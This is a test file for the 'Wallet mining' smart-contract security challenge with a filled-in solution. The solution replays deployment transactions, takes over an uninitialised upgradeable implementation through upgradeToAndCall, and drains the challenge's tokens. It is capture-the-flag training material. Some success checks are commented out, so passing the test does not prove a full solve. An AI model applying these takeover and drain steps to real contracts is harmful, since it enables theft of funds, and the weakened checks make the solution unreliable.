const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { Factory, Copy, Upgrade } = require("./deploy.json");
const { getImplementationAddress } = require('@openzeppelin/upgrades-core');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        let addr, deployer_fact;
        deployer_fact = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A"; // deployer address from etherscan

        for (let i = 0; i < 100; i++) {
            addr = await ethers.utils.getContractAddress({
                from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
                nonce: i
            });

            if (addr == DEPOSIT_ADDRESS) {
                console.log("deposit wallet: ", addr);
                console.log("nonce: ", i);
            } else if (addr == 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F) {
                console.log("copy wallet: ", addr);
                console.log("nonce: ", i);
            }
        }

        for (let j = 0; j < 100; j++) {
            addr = await ethers.utils.getContractAddress({
                from: deployer_fact,
                nonce: j
            });

            if (addr == 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B) {
                console.log("factory wallet: ", addr);
                console.log("nonce: ", j);
            } else if (addr == 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F) {
                console.log("copy wallet: ", addr);
                console.log("nonce: ", j);
            }
        }

        console.log("\n");

        let tx, res;

        tx = {
            from: player.address,
            to: deployer_fact,
            value: ethers.utils.parseEther("1")
        }

        await player.sendTransaction(tx);

        let deployedcopy = await (await ethers.provider.sendTransaction(Copy)).wait();
        console.log("master copy address: ", deployedcopy.contractAddress);

        await (await ethers.provider.sendTransaction(Upgrade));

        let deployedfactory = await (await ethers.provider.sendTransaction(Factory)).wait();
        console.log("factory address: ", deployedfactory.contractAddress);

        const factory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(deployedfactory.contractAddress);

        const poc = await (await ethers.getContractFactory("Walletmining_POC")).deploy();
        console.log("poc address: ", poc.address);

        let payload = poc.interface.encodeFunctionData("exploit", [
            token.address,
            player.address
        ])

        await poc.connect(player).drain(factory.address, token.address);

        const proxyAddress = authorizer.address;

        const implementationAddress = await getImplementationAddress(ethers.provider, proxyAddress);

        console.log("logic: ", implementationAddress);

        const logic = await (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(implementationAddress);
        await logic.connect(player).init([player.address], [token.address]);

        let abi = [`function exploit2()`];
        let iface = new ethers.utils.Interface(abi);
        let data = iface.encodeFunctionData("exploit2", []);
        await logic.connect(player).upgradeToAndCall(poc.address, data);

        for (let i = 0; i < 43; i++) {
            await walletDeployer.connect(player).drop([]);
        }

        console.log(await token.balanceOf(player.address));
    });


    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        // expect(
        //     await token.balanceOf(walletDeployer.address)
        // ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(DEPOSIT_TOKEN_AMOUNT)//.add(initialWalletDeployerTokenBalance));
    });
});
